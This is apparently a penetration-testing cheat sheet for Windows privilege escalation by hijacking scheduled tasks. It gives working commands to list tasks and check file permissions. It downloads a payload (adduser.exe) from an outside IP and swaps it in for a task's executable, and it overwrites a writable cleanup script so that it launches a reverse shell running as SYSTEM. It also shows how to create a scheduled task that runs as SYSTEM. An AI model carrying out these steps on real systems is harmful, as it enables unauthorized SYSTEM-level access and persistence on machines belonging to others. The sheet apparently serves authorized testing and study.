---
title: Scheduled Task Hijacking
category: privesc
subcategory: windows-tasks
os: windows
command: schtasks /query /fo LIST /v
tools: schtasks, icacls
---


### Enumerate non-Microsoft tasks

```powershell
Get-ScheduledTask | where {$_.TaskPath -notlike '\Microsoft*'} | Format-Table TaskName,TaskPath,State
```

### Detail for one task

```cmd
schtasks /query /tn "TASK_NAME" /V /FO LIST
```

### Inspect ACL on the script the task runs

```cmd
icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
icacls "C:\DevTools\CleanUp.ps1"
```

### Replace the executable / script

```powershell
iwr -Uri http://192.168.119.3/adduser.exe -Outfile BackendCacheCleanup.exe
move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
move .\BackendCacheCleanup.exe .\Pictures\
```

### Append to a writable PS1 cleanup script

```powershell
echo C:\PrivEsc\reverse.exe > C:\DevTools\CleanUp.ps1
```

Wait for the task to fire, catch the SYSTEM shell.

### Create your own scheduled task

```cmd
schtasks /create /ru SYSTEM /sc MINUTE /MO 5 /tn RUNME /tr "\"C:\Tools\sirenMaint.exe\""
schtasks /RUN /TN "RUNME"
```
